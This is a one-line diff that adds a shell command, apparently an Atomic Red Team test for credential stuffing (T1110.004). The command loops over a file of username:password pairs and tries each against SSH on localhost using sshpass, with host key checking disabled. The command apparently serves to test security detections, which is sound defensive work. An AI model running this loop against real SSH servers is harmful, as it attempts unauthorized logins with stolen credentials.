@@ -1,0 +1,1 @@
+cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/; for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@localhost;done
